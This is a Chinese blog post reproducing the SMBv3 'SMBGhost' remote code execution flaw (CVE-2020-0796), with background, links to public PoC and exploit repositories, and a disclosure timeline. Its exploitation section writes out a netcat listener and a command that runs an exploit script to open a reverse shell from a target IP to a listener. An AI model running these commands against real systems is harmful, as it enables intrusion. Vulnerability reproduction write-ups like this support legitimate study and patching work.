# SMBv3 远程代码执行漏洞复现（CVE-2020-0796） - renblog - 博客园

> 原文：[`www.cnblogs.com/renhaoblog/p/13035409.html`](https://www.cnblogs.com/renhaoblog/p/13035409.html)

# 漏洞基本信息

服务器消息块（SMB），是一个网络通信协议，用于提供共享访问到文件，打印机和串行端口的节点之间的网络上。它还提供了经过身份验证的进程间通信机制。SMB 的大多数用法涉及运行 Microsoft Windows 的计算机，在引入 Active Directory 之前被称为“ Microsoft Windows 网络” 。相应的 Windows 服务是用于服务器组件的 LAN Manager 服务器和用于客户端组件的 LAN Manager 工作站。
Windows 10 和 Windows Server 2016 引入了 SMB 3.1.1 。除了在 SMB3 中添加的 AES-128 CCM 加密外，该版本还支持 AES-128 GCM 加密，并使用 SHA-512 哈希实现预认证完整性检查。当使用 SMB 2.x 和更高版本连接到客户端时，SMB 3.1.1 还使安全协商成为必需。
CVE-2020-0796，微软 SMBv3 Client/Server 远程代码执行漏洞。该漏洞存在于 srv2.sys 文件中，由于 SMB 没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。

# 漏洞复现

## 漏洞 POC 验证

![](img/8be857a554cbee1b2022e63edcbf7b24.png)

[SMBv3 漏洞检测 POC](https://github.com/ollypwn/SMBGhost)

## 漏洞 EXP 利用

1、nc 端口监听
![](img/fc327f268ffbb843e484ca176f7a897a.png)
2、

```
python3 SMBleedingGhost.py 192.168.2.153 192.168.2.137 8888

//说明：
//ncat -lvp <port>
//SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port> 
```

SMBv3 漏洞 EXP

# 漏洞时间线

3 月 10 日：微软发布安全通告 ADV200005，称 SMBv3 协议在处理某些请求的方式中存在代码执行漏洞，并提供了缓解措施。

3 月 11 日：国外某厂商针对该漏洞发布安全防护规则更新。

3 月 11 日：微软 SMBv3 协议远程代码执行漏洞（CVE-2020-0796）通告。

3 月 12 日：微软正式发布 CVE-2020-0796 安全通告和漏洞修复补丁。

3 月 13 日：微软 SMBv3 协议远程代码执行漏洞（CVE-2020-0796）处置手册。

导致系统蓝屏的漏洞利用程序：
![](img/fc821b3cabefb1e1867ceaa1b323bdb3.png)
3 月 30 日：该漏洞本地提权 PoC 流出。

3 月 31 日：复现本地提权利用并发布 PoC 情报。
![](img/25c84a3a331c19b2cf25d2802819a746.png)
4 月 14 日：有国外研究者发布疑似漏洞利用 EXP 演示视频，链接 https://twitter.com/RicercaSec/status/1249904222490918917。

6 月 2 日：监测到研究人员公布此漏洞远程利用代码，现实威胁提升。
![](img/a6c44a6da95a17115b0018b42958928d.png)

6 月 3 日：该漏洞远程利用 PoC 公开通告。

[SMBv3 漏洞本地提权](https://github.com/danigargu/CVE-2020-0796)
[msf 集成](https://github.com/rapid7/metasploit-framework/pulls)
[微软 SMBv3 协议远程代码执行漏洞（CVE-2020-0796）PoC 公开处置手册](https://mp.weixin.qq.com/s/q3dL6YI0K-cFLbNzySabHQ)

# 待更新

RCE

# 漏洞原理分析

[`www.cnblogs.com/backlion/p/13050249.html`](https://www.cnblogs.com/backlion/p/13050249.html)

# 声明

严禁读者利用以上介绍知识点对网站进行非法操作 , 本文仅用于技术交流和学习 , 如果您利用文章中介绍的知识对他人造成损失 , 后果由您自行承担 , 如果您不能同意该约定 , 请您务必不要阅读该文章 , 感谢您的配合!